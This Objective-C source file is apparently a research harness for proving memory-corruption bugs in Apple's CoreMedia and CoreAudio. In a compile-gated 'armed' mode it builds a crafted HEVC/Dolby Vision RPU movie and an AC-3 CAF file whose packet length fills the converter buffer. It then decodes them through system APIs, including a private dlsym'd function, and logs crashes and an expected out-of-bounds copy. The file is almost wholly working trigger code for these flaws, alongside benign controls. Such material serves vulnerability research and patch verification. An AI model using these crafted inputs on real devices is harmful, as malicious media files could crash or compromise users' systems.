#import "KPCMCA27ProbeModule.h"

#import "KPLog.h"

#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CommonCrypto/CommonDigest.h>
#import <CoreGraphics/CoreGraphics.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <VideoToolbox/VideoToolbox.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <signal.h>
#import <stdint.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

#ifndef KP_CMCA27_ENABLE_ARMED
#define KP_CMCA27_ENABLE_ARMED 0
#endif

#define KP_CM_SIGNAL_COUNT 6
#define KP_CA_PACKET_CAPACITY 0x1800
#define KP_CA_BENIGN_LENGTH 0x100

static const int KPCMCASignals[KP_CM_SIGNAL_COUNT] = {SIGSEGV, SIGBUS, SIGABRT, SIGILL, SIGFPE, SIGTRAP};
static volatile sig_atomic_t gCMCAActive;
static int gCMCAJournalFD = -1;
static const char *gCMCAIdentifier;
static size_t gCMCAIdentifierLength;

@interface KPCMCA27ProbeModule ()
@property (nonatomic, assign, readwrite) NSUInteger component;
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@end

@implementation KPCMCA27ProbeModule

- (instancetype)initWithArmed:(BOOL)armed component:(NSUInteger)component {
    self = [super init];
    if (self) {
        _armed = armed;
        _component = component;
        if (component == 0) {
            _identifier = armed ? @"cm113950.mmr3" : @"cm113950.mmr0";
            _title = armed ? @"CM 113950 MMR Order 3" : @"CM MMR Order 0 Control";
            _subtitle = armed
                ? @"Explicit tap · HEVC RPU NAL 62 · MMR row 4 · MP4 decode"
                : @"HEVC RPU NAL 62 · valid MMR order · MP4 decode";
            _icon = armed ? @"exclamationmark.triangle" : @"video";
        } else {
            _identifier = armed ? @"ca113912.ac3-n1800" : @"ca113912.ac3-control";
            _title = armed ? @"CA 113912 AC3 N=B=A" : @"CA AC3 Short-Packet Control";
            _subtitle = armed
                ? @"Explicit tap · CAF ac-3 → cac3 · N=B=A=0x1800"
                : @"CAF ac-3 → cac3 · N=0x100 · bounded converter call";
            _icon = armed ? @"exclamationmark.triangle" : @"waveform";
        }
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (instancetype)initWithArmed:(BOOL)armed {
    return [self initWithArmed:armed component:0];
}

static NSError *KPCMCAError(NSString *description) {
    return [NSError errorWithDomain:@"KPCMCA27" code:1 userInfo:@{NSLocalizedDescriptionKey: description}];
}

static BOOL KPCMCAWriteFD(int fd, const void *bytes, size_t length) {
    const uint8_t *position = bytes;
    while (length) {
        ssize_t written = write(fd, position, length);
        if (written < 0) {
            if (errno == EINTR) continue;
            return NO;
        }
        if (!written) return NO;
        position += written;
        length -= (size_t)written;
    }
    return YES;
}

static BOOL KPCMCAJournalLine(int fd, NSString *line) {
    NSData *data = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
    return KPCMCAWriteFD(fd, data.bytes, data.length) && fsync(fd) == 0;
}

static NSString *KPCMCAHomeDirectory(void) {
#if KP_CMCA27_STANDALONE
#ifndef KP_CMCA27_STANDALONE_HOME
#define KP_CMCA27_STANDALONE_HOME @"/var/tmp/cmca27"
#endif
    return KP_CMCA27_STANDALONE_HOME;
#else
    return NSHomeDirectory();
#endif
}

static NSString *KPCMCAJournalPath(NSUInteger component, BOOL armed) {
    NSString *name = component == 0 ? @"cm113950" : @"ca113912";
    return [[KPCMCAHomeDirectory() stringByAppendingPathComponent:@"Documents"] stringByAppendingPathComponent:
            [NSString stringWithFormat:@"kexproofv3-%@-%@-journal.log", name, armed ? @"armed" : @"control"]];
}

static int KPCMCAOpenJournal(NSUInteger component, BOOL armed, NSError **error) {
    NSString *documents = [KPCMCAHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    if (![[NSFileManager defaultManager] createDirectoryAtPath:documents withIntermediateDirectories:YES attributes:nil error:error]) {
        return -1;
    }
    return open(KPCMCAJournalPath(component, armed).fileSystemRepresentation,
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
}

static NSString *KPCMCASHA256(NSData *data) {
    uint8_t digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    NSMutableString *result = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (NSUInteger index = 0; index < sizeof(digest); index++) [result appendFormat:@"%02x", digest[index]];
    return result;
}

static size_t KPCMCACStringLength(const char *string) {
    size_t length = 0;
    while (string[length]) length++;
    return length;
}

static size_t KPCMCAUnsignedString(char *output, uint64_t value, unsigned base) {
    char reversed[32];
    size_t count = 0;
    do {
        unsigned digit = (unsigned)(value % base);
        reversed[count++] = (char)(digit < 10 ? '0' + digit : 'a' + digit - 10);
        value /= base;
    } while (value && count < sizeof(reversed));
    for (size_t index = 0; index < count; index++) output[index] = reversed[count - index - 1];
    return count;
}

static const char *KPCMCASignalName(int signalNumber) {
    switch (signalNumber) {
        case SIGSEGV: return "SIGSEGV";
        case SIGBUS: return "SIGBUS";
        case SIGABRT: return "SIGABRT";
        case SIGILL: return "SIGILL";
        case SIGFPE: return "SIGFPE";
        case SIGTRAP: return "SIGTRAP";
        default: return "UNKNOWN";
    }
}

static void KPCMCACrashHandler(int signalNumber, siginfo_t *info, void *context) {
    (void)context;
    if (gCMCAActive && gCMCAJournalFD >= 0) {
        const char *identifier = gCMCAIdentifier ? gCMCAIdentifier : "unknown";
        const char *signalName = KPCMCASignalName(signalNumber);
        char number[32];
        size_t length;
        KPCMCAWriteFD(gCMCAJournalFD, "CRASH id=", 9);
        KPCMCAWriteFD(gCMCAJournalFD, identifier, gCMCAIdentifierLength);
        KPCMCAWriteFD(gCMCAJournalFD, " signal=", 8);
        KPCMCAWriteFD(gCMCAJournalFD, signalName, KPCMCACStringLength(signalName));
        KPCMCAWriteFD(gCMCAJournalFD, " sig=", 5);
        length = KPCMCAUnsignedString(number, (uint64_t)signalNumber, 10);
        KPCMCAWriteFD(gCMCAJournalFD, number, length);
        KPCMCAWriteFD(gCMCAJournalFD, " code=", 6);
        length = KPCMCAUnsignedString(number, info ? (uint64_t)info->si_code : 0, 10);
        KPCMCAWriteFD(gCMCAJournalFD, number, length);
        KPCMCAWriteFD(gCMCAJournalFD, " address=0x", 11);
        length = KPCMCAUnsignedString(number, (uint64_t)(uintptr_t)(info ? info->si_addr : NULL), 16);
        KPCMCAWriteFD(gCMCAJournalFD, number, length);
        KPCMCAWriteFD(gCMCAJournalFD, "\n", 1);
    }
    _exit(128 + signalNumber);
}

static NSUInteger KPCMCAArmSignals(int journalFD, const char *identifier,
                                   struct sigaction oldActions[KP_CM_SIGNAL_COUNT]) {
    gCMCAJournalFD = journalFD;
    gCMCAIdentifier = identifier;
    gCMCAIdentifierLength = strlen(identifier);
    struct sigaction action;
    memset(&action, 0, sizeof(action));
    action.sa_sigaction = KPCMCACrashHandler;
    sigemptyset(&action.sa_mask);
    action.sa_flags = SA_SIGINFO;
    NSUInteger installed = 0;
    for (; installed < KP_CM_SIGNAL_COUNT; installed++) {
        if (sigaction(KPCMCASignals[installed], &action, &oldActions[installed]) != 0) {
            for (NSUInteger rollback = 0; rollback < installed; rollback++) {
                sigaction(KPCMCASignals[rollback], &oldActions[rollback], NULL);
            }
            gCMCAJournalFD = -1;
            gCMCAIdentifier = NULL;
            gCMCAIdentifierLength = 0;
            return 0;
        }
    }
    gCMCAActive = 1;
    return installed;
}

static void KPCMCARestoreSignals(struct sigaction oldActions[KP_CM_SIGNAL_COUNT], NSUInteger installed) {
    gCMCAActive = 0;
    for (NSUInteger index = 0; index < installed; index++) sigaction(KPCMCASignals[index], &oldActions[index], NULL);
    gCMCAJournalFD = -1;
    gCMCAIdentifier = NULL;
    gCMCAIdentifierLength = 0;
}

static NSData *KPCMCAReadRPUPayload(BOOL armed, NSError **error) {
    NSString *resource = armed ? @"rpu-mmr-3" : @"rpu-mmr-0";
#if KP_CMCA27_STANDALONE
    NSURL *URL = [NSURL fileURLWithPath:[[KPCMCAHomeDirectory() stringByAppendingPathComponent:@"Resources"] stringByAppendingPathComponent:[resource stringByAppendingString:@".bin"]]];
#else
    NSURL *URL = [NSBundle.mainBundle URLForResource:resource withExtension:@"bin"];
#endif
    if (!URL) {
        if (error) *error = KPCMCAError([NSString stringWithFormat:@"Missing %@.bin", resource]);
        return nil;
    }
    return [NSData dataWithContentsOfURL:URL options:0 error:error];
}

static CMSampleBufferRef KPCMEncodeFrame(int journalFD) {
    __block CMSampleBufferRef encoded = NULL;
    VTCompressionSessionRef session = NULL;
    CVPixelBufferRef pixel = NULL;
    OSStatus status = VTCompressionSessionCreate(kCFAllocatorDefault, 16, 16, kCMVideoCodecType_HEVC,
                                                 NULL, NULL, NULL, NULL, NULL, &session);
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_ENCODE_CREATE status=%d session=%p", status, session]);
    if (status != 0 || !session) goto cleanup;
    status = VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_ENCODE_REALTIME status=%d", status]);
    if (status != 0) goto cleanup;
    status = CVPixelBufferCreate(kCFAllocatorDefault, 16, 16, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                 (__bridge CFDictionaryRef)@{(NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}}, &pixel);
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_ENCODE_PIXEL status=%d pixel=%p", status, pixel]);
    if (status != 0 || !pixel) goto cleanup;
    status = CVPixelBufferLockBaseAddress(pixel, 0);
    if (status != 0) goto cleanup;
    for (size_t plane = 0; plane < CVPixelBufferGetPlaneCount(pixel); plane++) {
        size_t height = CVPixelBufferGetHeightOfPlane(pixel, plane);
        size_t rowBytes = CVPixelBufferGetBytesPerRowOfPlane(pixel, plane);
        void *base = CVPixelBufferGetBaseAddressOfPlane(pixel, plane);
        if (!base) {
            CVPixelBufferUnlockBaseAddress(pixel, 0);
            goto cleanup;
        }
        memset(base, plane == 0 ? 0x40 : 0x80, height * rowBytes);
    }
    status = CVPixelBufferUnlockBaseAddress(pixel, 0);
    if (status != 0) goto cleanup;
    KPCMCAJournalLine(journalFD, @"BEFORE_CM_ENCODE_FRAME width=16 height=16");
    status = VTCompressionSessionEncodeFrameWithOutputHandler(
        session, pixel, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL,
        ^(OSStatus callbackStatus, VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
            (void)infoFlags;
            if (callbackStatus == 0 && sampleBuffer && !encoded) encoded = (CMSampleBufferRef)CFRetain(sampleBuffer);
        });
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_ENCODE_SUBMIT status=%d", status]);
    if (status != 0) goto cleanup;
    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_ENCODE_COMPLETE status=%d encoded=%p", status, encoded]);
cleanup:
    if (pixel) CVPixelBufferRelease(pixel);
    if (session) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }
    return encoded;
}

static CMSampleBufferRef KPCMMakeSampleWithRPU(CMSampleBufferRef encoded, NSData *rpu, int journalFD) {
    if (!encoded || !rpu) return NULL;
    CMFormatDescriptionRef format = CMSampleBufferGetFormatDescription(encoded);
    CMBlockBufferRef encodedBuffer = CMSampleBufferGetDataBuffer(encoded);
    if (!format || !encodedBuffer) return NULL;
    size_t encodedLength = CMBlockBufferGetDataLength(encodedBuffer);
    uint8_t *encodedBytes = NULL;
    size_t offset = 0;
    OSStatus status = CMBlockBufferGetDataPointer(encodedBuffer, 0, &offset, NULL, (char **)&encodedBytes);
    if (status != 0 || !encodedBytes) {
        KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_SAMPLE_DATA_POINTER status=%d", status]);
        return NULL;
    }
    NSMutableData *payload = [NSMutableData dataWithCapacity:rpu.length + 6 + encodedLength];
    uint32_t nalLength = CFSwapInt32HostToBig((uint32_t)(rpu.length + 2));
    const uint8_t header[] = {0x7c, 0x01};
    [payload appendBytes:&nalLength length:sizeof(nalLength)];
    [payload appendBytes:header length:sizeof(header)];
    [payload appendData:rpu];
    [payload appendBytes:encodedBytes length:encodedLength];
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:
                                  @"CM_SAMPLE_LAYOUT rpu_nal_type=62 rpu_payload=%zu encoded=%zu total=%zu",
                                  rpu.length, encodedLength, payload.length]);
    CMBlockBufferRef block = NULL;
    status = CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault, NULL, payload.length, kCFAllocatorDefault,
                                                NULL, 0, payload.length, 0, &block);
    if (status != 0 || !block) return NULL;
    status = CMBlockBufferReplaceDataBytes(payload.bytes, block, 0, payload.length);
    if (status != 0) {
        CFRelease(block);
        return NULL;
    }
    CMSampleTimingInfo timing;
    if (CMSampleBufferGetSampleTimingInfo(encoded, 0, &timing) != 0) {
        timing.presentationTimeStamp = CMTimeMake(0, 30);
        timing.decodeTimeStamp = kCMTimeInvalid;
        timing.duration = CMTimeMake(1, 30);
    }
    size_t sampleSize = payload.length;
    CMSampleBufferRef sample = NULL;
    status = CMSampleBufferCreate(kCFAllocatorDefault, block, true, NULL, NULL, format, 1, 1, &timing, 1, &sampleSize, &sample);
    CFRelease(block);
    if (status != 0) return NULL;
    return sample;
}

static BOOL KPCMWriteMovie(CMSampleBufferRef sample, NSURL *URL, int journalFD, NSError **error) {
    [[NSFileManager defaultManager] removeItemAtURL:URL error:nil];
    AVAssetWriter *writer = [AVAssetWriter assetWriterWithURL:URL fileType:AVFileTypeMPEG4 error:error];
    if (!writer) return NO;
    CMFormatDescriptionRef format = CMSampleBufferGetFormatDescription(sample);
    AVAssetWriterInput *input = [AVAssetWriterInput assetWriterInputWithMediaType:AVMediaTypeVideo
                                                                  outputSettings:nil
                                                                sourceFormatHint:format];
    input.expectsMediaDataInRealTime = NO;
    if (![writer canAddInput:input]) return NO;
    [writer addInput:input];
    if (![writer startWriting]) {
        if (error) *error = writer.error;
        return NO;
    }
    CMSampleTimingInfo timing;
    if (CMSampleBufferGetSampleTimingInfo(sample, 0, &timing) != 0) {
        timing.presentationTimeStamp = CMTimeMake(0, 30);
    }
    [writer startSessionAtSourceTime:timing.presentationTimeStamp];
    KPCMCAJournalLine(journalFD, @"BEFORE_CM_ASSET_WRITER_APPEND");
    BOOL appended = [input appendSampleBuffer:sample];
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_ASSET_WRITER_APPEND ok=%d error=%@", appended, writer.error]);
    if (!appended) {
        if (error) *error = writer.error;
        return NO;
    }
    [input markAsFinished];
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    [writer finishWritingWithCompletionHandler:^{ dispatch_semaphore_signal(semaphore); }];
    if (dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC)) != 0) {
        if (error) *error = KPCMCAError(@"AVAssetWriter timeout");
        return NO;
    }
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_ASSET_WRITER_STATUS status=%ld error=%@",
                                  (long)writer.status, writer.error]);
    if (writer.status != AVAssetWriterStatusCompleted) {
        if (error) *error = writer.error;
        return NO;
    }
    return YES;
}

static BOOL KPCMDecodeMovie(NSURL *URL, int journalFD, NSError **error) {
    AVAsset *asset = [AVAsset assetWithURL:URL];
    AVAssetImageGenerator *generator = [AVAssetImageGenerator assetImageGeneratorWithAsset:asset];
    generator.appliesPreferredTrackTransform = YES;
    generator.maximumSize = CGSizeMake(64, 64);
    CMTime actual = kCMTimeZero;
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"BEFORE_CM_DECODE path=%@", URL.lastPathComponent]);
    CGImageRef image = [generator copyCGImageAtTime:CMTimeMake(0, 30) actualTime:&actual error:error];
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"CM_DECODE_RESULT image=%p error=%@", image, *error]);
    if (!image) return NO;
    size_t width = CGImageGetWidth(image);
    size_t height = CGImageGetHeight(image);
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
    CGContextRef context = CGBitmapContextCreate(NULL, width, height, 8, width * 4, colorSpace,
                                                 kCGImageAlphaPremultipliedLast);
    if (!context) {
        if (colorSpace) CGColorSpaceRelease(colorSpace);
        CGImageRelease(image);
        return NO;
    }
    KPCMCAJournalLine(journalFD, [NSString stringWithFormat:@"BEFORE_CM_RENDER width=%zu height=%zu", width, height]);
    CGContextDrawImage(context, CGRectMake(0, 0, width, height), image);
    CGContextFlush(context);
    KPCMCAJournalLine(journalFD, @"AFTER_CM_RENDER");
    CGContextRelease(context);
    if (colorSpace) CGColorSpaceRelease(colorSpace);
    CGImageRelease(image);
    return YES;
}

static uint32_t KPCMCallVersion(CFDataRef data, BOOL *available) {
    static void *handle;
    static uint32_t (*function)(CFDataRef);
    if (!function) {
        handle = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
        if (handle) function = (uint32_t (*)(CFDataRef))dlsym(handle, "CMGetDMVersionLevelFromRPU");
    }
    if (!function) {
        if (available) *available = NO;
        return 0;
    }
    if (available) *available = YES;
    return function(data);
}

- (NSString *)runCoreMedia {
    NSMutableString *report = [NSMutableString string];
    NSData *movie = nil;
    NSString *name = self.isArmed ? @"cm113950-mmr3.mp4" : @"cm113950-mmr0.mp4";
    NSURL *URL = [NSURL fileURLWithPath:[[KPCMCAHomeDirectory() stringByAppendingPathComponent:@"Documents"] stringByAppendingPathComponent:name]];
    NSError *error = nil;
    int fd = KPCMCAOpenJournal(0, self.isArmed, &error);
    if (fd < 0) return [NSString stringWithFormat:@"JOURNAL SETUP FAILED: %@\n", error.localizedDescription];
    const char *identifier = self.isArmed ? "cm113950.mmr3" : "cm113950.mmr0";
    struct sigaction oldActions[KP_CM_SIGNAL_COUNT];
    if (KPCMCAArmSignals(fd, identifier, oldActions) != KP_CM_SIGNAL_COUNT) {
        close(fd);
        return @"SIGNAL SETUP FAILED\n";
    }
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"BEGIN id=%s mmr_order_minus1=%d os=%@",
                           identifier, self.isArmed ? 3 : 0, NSProcessInfo.processInfo.operatingSystemVersionString]);
    NSData *rpu = KPCMCAReadRPUPayload(self.isArmed, &error);
    if (!rpu) {
        KPCMCAJournalLine(fd, [NSString stringWithFormat:@"END result=FAILED stage=RPU_RESOURCE error=%@", error]);
        goto cleanup;
    }
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"CM_RPU bytes=%zu sha256=%@", rpu.length, KPCMCASHA256(rpu)]);
    CMSampleBufferRef encoded = KPCMEncodeFrame(fd);
    if (!encoded) {
        KPCMCAJournalLine(fd, @"END result=FAILED stage=CM_ENCODE");
        goto cleanup;
    }
    CMSampleBufferRef sample = KPCMMakeSampleWithRPU(encoded, rpu, fd);
    CFRelease(encoded);
    if (!sample) {
        KPCMCAJournalLine(fd, @"END result=FAILED stage=CM_SAMPLE");
        goto cleanup;
    }
    if (!KPCMWriteMovie(sample, URL, fd, &error)) {
        KPCMCAJournalLine(fd, [NSString stringWithFormat:@"END result=FAILED stage=CM_WRITER error=%@", error]);
        CFRelease(sample);
        goto cleanup;
    }
    CFRelease(sample);
    movie = [NSData dataWithContentsOfURL:URL options:0 error:nil];
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"CM_MOVIE path=%@ bytes=%zu sha256=%@",
                           URL.path, movie.length, KPCMCASHA256(movie)]);
    if (!KPCMDecodeMovie(URL, fd, &error)) {
        KPCMCAJournalLine(fd, [NSString stringWithFormat:@"END result=FAILED stage=CM_DECODE error=%@", error]);
        goto cleanup;
    }
    KPCMCAJournalLine(fd, @"BEFORE_CM_DIRECT_RPU_PARSE");
    BOOL available = NO;
    uint32_t version = KPCMCallVersion((__bridge CFDataRef)rpu, &available);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"CM_DIRECT_RPU_RESULT version=%u available=%d", version, available]);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"END result=SURVIVED id=%s", identifier]);
    [report appendFormat:@"CM file: %@\nSHA-256: %@\nDirect RPU version=%u; decode/render survived.\n",
     URL.path, KPCMCASHA256(movie), version];
cleanup:
    KPCMCARestoreSignals(oldActions, KP_CM_SIGNAL_COUNT);
    close(fd);
    if (!report.length) [report appendFormat:@"Journal: %@\n", KPCMCAJournalPath(0, self.isArmed)];
    return report;
}

static void KPCABE16(NSMutableData *data, uint16_t value) {
    value = CFSwapInt16HostToBig(value);
    [data appendBytes:&value length:sizeof(value)];
}

static void KPCABE32(NSMutableData *data, uint32_t value) {
    value = CFSwapInt32HostToBig(value);
    [data appendBytes:&value length:sizeof(value)];
}

static void KPCABE64(NSMutableData *data, uint64_t value) {
    value = CFSwapInt64HostToBig(value);
    [data appendBytes:&value length:sizeof(value)];
}

static NSData *KPCAMakeCAF(BOOL armed) {
    uint32_t packetLength = armed ? KP_CA_PACKET_CAPACITY : KP_CA_BENIGN_LENGTH;
    AudioStreamBasicDescription asbd;
    memset(&asbd, 0, sizeof(asbd));
    asbd.mSampleRate = 48000.0;
    asbd.mFormatID = kAudioFormatAC3;
    asbd.mBytesPerPacket = packetLength;
    asbd.mFramesPerPacket = 0x600;
    asbd.mChannelsPerFrame = 2;
    NSMutableData *data = [NSMutableData dataWithCapacity:76 + packetLength];
    [data appendBytes:"caff" length:4];
    KPCABE16(data, 1);
    KPCABE16(data, 0);
    [data appendBytes:"desc" length:4];
    KPCABE64(data, 32);
    KPCABE64(data, *(uint64_t *)&asbd.mSampleRate);
    KPCABE32(data, asbd.mFormatID);
    KPCABE32(data, asbd.mFormatFlags);
    KPCABE32(data, asbd.mBytesPerPacket);
    KPCABE32(data, asbd.mFramesPerPacket);
    KPCABE32(data, asbd.mChannelsPerFrame);
    KPCABE32(data, asbd.mBitsPerChannel);
    KPCABE32(data, asbd.mReserved);
    [data appendBytes:"data" length:4];
    KPCABE64(data, 4 + packetLength);
    KPCABE32(data, 0);
    uint8_t *packet = malloc(packetLength);
    memset(packet, 0xa5, packetLength);
    packet[0] = 0x0b;
    packet[1] = 0x77;
    [data appendBytes:packet length:packetLength];
    free(packet);
    return data;
}

typedef struct {
    uint8_t *bytes;
    uint32_t length;
} KPCAInputContext;

static OSStatus KPCAInputProc(AudioConverterRef converter, UInt32 *ioNumberDataPackets,
                              AudioBufferList *ioData, AudioStreamPacketDescription **outDataPacketDescription,
                              void *inUserData) {
    (void)converter;
    KPCAInputContext *context = inUserData;
    *ioNumberDataPackets = 1;
    ioData->mNumberBuffers = 1;
    ioData->mBuffers[0].mNumberChannels = 2;
    ioData->mBuffers[0].mDataByteSize = context->length;
    ioData->mBuffers[0].mData = context->bytes;
    if (outDataPacketDescription) *outDataPacketDescription = NULL;
    return noErr;
}

- (NSString *)runCoreAudio {
    NSMutableString *report = [NSMutableString string];
    NSError *error = nil;
    int fd = KPCMCAOpenJournal(1, self.isArmed, &error);
    if (fd < 0) return [NSString stringWithFormat:@"JOURNAL SETUP FAILED: %@\n", error.localizedDescription];
    const char *identifier = self.isArmed ? "ca113912.ac3-n1800" : "ca113912.ac3-control";
    struct sigaction oldActions[KP_CM_SIGNAL_COUNT];
    if (KPCMCAArmSignals(fd, identifier, oldActions) != KP_CM_SIGNAL_COUNT) {
        close(fd);
        return @"SIGNAL SETUP FAILED\n";
    }
    uint32_t packetLength = self.isArmed ? KP_CA_PACKET_CAPACITY : KP_CA_BENIGN_LENGTH;
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"BEGIN id=%s N=0x%x B=A=0x%x os=%@",
                           identifier, packetLength, KP_CA_PACKET_CAPACITY,
                           NSProcessInfo.processInfo.operatingSystemVersionString]);
    NSData *caf = KPCAMakeCAF(self.isArmed);
    NSString *name = self.isArmed ? @"ca113912-ac3-n1800.caf" : @"ca113912-ac3-control.caf";
    NSURL *URL = [NSURL fileURLWithPath:[[KPCMCAHomeDirectory() stringByAppendingPathComponent:@"Documents"] stringByAppendingPathComponent:name]];
    if (![caf writeToURL:URL atomically:NO]) {
        KPCMCAJournalLine(fd, @"END result=FAILED stage=CAF_WRITE");
        goto cleanup;
    }
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"CA_FILE path=%@ bytes=%zu sha256=%@",
                           URL.path, caf.length, KPCMCASHA256(caf)]);
    AudioFileID file = NULL;
    OSStatus status = AudioFileOpenURL((__bridge CFURLRef)URL, kAudioFileReadPermission, 0, &file);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"CA_AUDIO_FILE_OPEN status=%d file=%p", status, file]);
    if (status != 0 || !file) goto cleanup;
    AudioStreamBasicDescription input;
    UInt32 size = sizeof(input);
    status = AudioFileGetProperty(file, kAudioFilePropertyDataFormat, &size, &input);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:
                           @"CA_INPUT_ASBD status=%d format=0x%x rate=%.0f BPP=%u FPP=%u channels=%u",
                           status, (unsigned)input.mFormatID, input.mSampleRate,
                           (unsigned)input.mBytesPerPacket, (unsigned)input.mFramesPerPacket,
                           (unsigned)input.mChannelsPerFrame]);
    if (status != 0) {
        AudioFileClose(file);
        goto cleanup;
    }
    uint8_t *packet = malloc(packetLength);
    UInt32 byteCount = packetLength;
    UInt32 packetCount = 1;
    status = AudioFileReadPackets(file, false, &byteCount, NULL, 0, &packetCount, packet);
    AudioFileClose(file);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"CA_READ_PACKETS status=%d bytes=%u packets=%u",
                           status, byteCount, packetCount]);
    if (status != 0 || byteCount != packetLength) {
        free(packet);
        goto cleanup;
    }
    AudioStreamBasicDescription output;
    memset(&output, 0, sizeof(output));
    output.mSampleRate = 48000.0;
    output.mFormatID = 0x63616333;
    output.mFormatFlags = 0x0c;
    output.mBytesPerPacket = KP_CA_PACKET_CAPACITY;
    output.mFramesPerPacket = 0x600;
    output.mChannelsPerFrame = 4;
    output.mBitsPerChannel = 2;
    output.mReserved = 0x10;
    AudioConverterRef converter = NULL;
    status = AudioConverterNew(&input, &output, &converter);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"CA_CONVERTER_NEW status=%d converter=%p output=cac3 B=0x%x",
                           status, converter, KP_CA_PACKET_CAPACITY]);
    if (status != 0 || !converter) {
        KPCMCAJournalLine(fd, [NSString stringWithFormat:@"END result=NOT_REACHED stage=CA_CONVERTER_NEW status=%d", status]);
        [report appendFormat:@"CAF: %@\nSHA-256: %@\nAudioConverterNew status=%d; conversion path not reached.\n",
         URL.path, KPCMCASHA256(caf), status];
        free(packet);
        goto cleanup;
    }
    AudioBufferList *outputBuffers = malloc(sizeof(AudioBufferList));
    outputBuffers->mNumberBuffers = 1;
    outputBuffers->mBuffers[0].mNumberChannels = output.mChannelsPerFrame;
    outputBuffers->mBuffers[0].mDataByteSize = KP_CA_PACKET_CAPACITY;
    outputBuffers->mBuffers[0].mData = malloc(KP_CA_PACKET_CAPACITY);
    KPCAInputContext context = {packet, packetLength};
    UInt32 outputPacketCount = 1;
    KPCMCAJournalLine(fd, [NSString stringWithFormat:
                           @"BEFORE_CA_CONVERT N=0x%x B=A=0x%x expected_old_copy=8+0x1800 old_remaining_u64=0xfffffffffffffff8",
                           packetLength, KP_CA_PACKET_CAPACITY]);
    status = AudioConverterFillComplexBuffer(converter, KPCAInputProc, &context, &outputPacketCount,
                                             outputBuffers, NULL);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"AFTER_CA_CONVERT status=%d outputPackets=%u", status, outputPacketCount]);
    KPCMCAJournalLine(fd, [NSString stringWithFormat:@"END result=SURVIVED id=%s status=%d", identifier, status]);
    [report appendFormat:@"CAF: %@\nSHA-256: %@\nAudioConverter status=%d; survived.\n",
     URL.path, KPCMCASHA256(caf), status];
    free(outputBuffers->mBuffers[0].mData);
    free(outputBuffers);
    AudioConverterDispose(converter);
    free(packet);
cleanup:
    KPCMCARestoreSignals(oldActions, KP_CM_SIGNAL_COUNT);
    close(fd);
    if (!report.length) [report appendFormat:@"Journal: %@\n", KPCMCAJournalPath(1, self.isArmed)];
    return report;
}

- (NSString *)runReport {
#if KP_CMCA27_ENABLE_ARMED
    return self.component == 0 ? [self runCoreMedia] : [self runCoreAudio];
#else
    if (self.isArmed) return @"Armed execution was NOT COMPILED. KP_CMCA27_ENABLE_ARMED=1 is required.\n";
    return self.component == 0 ? [self runCoreMedia] : [self runCoreAudio];
#endif
}

@end

#if KP_CMCA27_STANDALONE
const char *KPCMCA27RunProbe(BOOL armed, NSUInteger component) {
    @autoreleasepool {
        KPCMCA27ProbeModule *module = [[KPCMCA27ProbeModule alloc] initWithArmed:armed component:component];
        return strdup([module runReport].UTF8String);
    }
}
#endif
